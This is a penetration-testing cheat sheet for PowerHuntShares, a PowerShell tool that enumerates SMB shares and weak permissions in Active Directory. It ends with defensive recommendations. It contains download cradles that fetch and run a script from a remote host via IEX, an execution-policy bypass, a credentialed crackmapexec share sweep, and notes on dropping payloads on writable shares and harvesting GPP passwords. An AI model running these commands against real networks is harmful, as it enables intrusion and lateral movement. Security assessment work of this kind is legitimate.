# 📂 PowerHuntShares — SMB Share Enumeration & Analysis

> **Category:** Offensive Active Directory → Domain Enumeration
> **Tags:** `PowerShell` `SMB` `Active Directory` `Privilege Escalation` `Lateral Movement`

---

## 📖 Overview

**PowerHuntShares** is a PowerShell tool used for discovering and analyzing network shares within an **Active Directory** environment. It helps identify **insecure or misconfigured shared folders** that could lead to **privilege escalation** or **lateral movement** by attackers.

- Discovers all network shares in an Active Directory environment
- Identifies weak permissions (e.g., `Everyone` or `Authenticated Users` with `Write` access)
- Generates CSV and JSON reports for easy analysis
- Useful for security assessments to find potential attack paths

**GitHub Repo:** [NetSPI/PowerHuntShares](https://github.com/NetSPI/PowerHuntShares)

---

## ⚙️ PowerHuntShares Features

PowerHuntShares scans Active Directory environments for exposed network shares and generates reports to help security teams.

| Feature | Description |
|---|---|
| **Enumerate SMB Shares** | Identifies and lists accessible SMB network shares |
| **Permission Analysis** | Checks for overly permissive access rights (e.g., `Everyone` or `Authenticated Users`) |
| **Recursive Scanning** | Identifies subdirectories with weak permissions |
| **Identify Sensitive Files** | Detects potential sensitive files (e.g., `.config`, `.txt`, `.xlsx`) |
| **CSV Output** | Saves results for further analysis |

---

## 🧪 Setup & Execution

### 1. Clone the Repository

```bash
git clone https://github.com/NetSPI/PowerHuntShares.git
cd PowerHuntShares
```

### 2. Transfer to Target Machine

Pick whichever download method fits your access:

```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.10.7/PowerHuntShares.ps1', 'PowerHuntShares.ps1')
```

```powershell
Invoke-WebRequest http://192.168.10.7/PowerHuntShares.psm1 -OutFile PowerHuntShares.psm1
```

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.7/PowerHuntShares.psm1')
```

### 3. Bypass Execution Policy

```powershell
powershell -nop -ep bypass
```

### 4. Unblock the Script

```powershell
Unblock-File -Path .\PowerHuntShares.ps1
```

### 5. Execute

```powershell
.\PowerHuntShares.ps1 -Verbose
```

**Or import it as a module** to access its functions directly:

```powershell
Import-Module .\PowerHuntShares.psm1
```

---

## 🧰 Core Commands

### 🔍 Enumerate Open Shares

```powershell
Find-OpenShares -Verbose
```

### 🌐 Scan Specific Domain

```powershell
Find-OpenShares -Domain "infosecwarrior.local"
```

### 🎯 Target Specific Host

```powershell
Find-OpenShares -ComputerName "Target-PC"
```

### 💾 Export Results

```powershell
Find-OpenShares | Export-Csv -Path "Shares_Report.csv" -NoTypeInformation
```

---

## 🚀 Advanced Enumeration

### Host List Scanning (Stealthier)

```powershell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\ADtools\ -HostList C:\ADtools\servers.txt
```

**Parameters:**

| Parameter | Description |
|---|---|
| `-NoPing` | Skip ICMP checks (useful if ping is blocked) |
| `-HostList` | File containing target hosts |
| `-OutputDirectory` | Location to store results |

**Example Host List (`servers.txt`):**

```
192.168.1.10
192.168.1.20
DC01
FileServer
```

---

## 🎯 Filtering & Hunting

### 🔓 Find Sensitive Shares

```powershell
Find-OpenShares -Verbose | Where-Object { $_.Path -match "finance|password|backup" }
```

### ⚠️ Identify Weak Permissions

> Filter results for shares granting `Everyone` / `Authenticated Users` write access — see the **Permission Analysis** feature above.

---

## 🕵️ Post-Enumeration: Attack Paths

### Lateral Movement

- Writable shares → drop payloads
- Execute via:
  - SMB
  - Scheduled tasks
  - Services

### Privilege Escalation

Misconfigured shares may expose:
- Scripts running as admin
- GPP passwords
- Deployment configs

### Combine with Other Tools

```bash
crackmapexec smb 192.168.1.0/24 --shares -u user -p pass
```

---

## 🛡️ Defensive Recommendations (Blue Team)

- ✅ Remove `Everyone` / `Authenticated Users` from sensitive shares
- ✅ Enable auditing — `Object Access` via Group Policy
- ✅ Disable SMBv1 (use SMBv2/v3)
- ✅ Periodically audit shares

---

## 📚 References

- [PowerHuntShares — NetSPI GitHub](https://github.com/NetSPI/PowerHuntShares)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
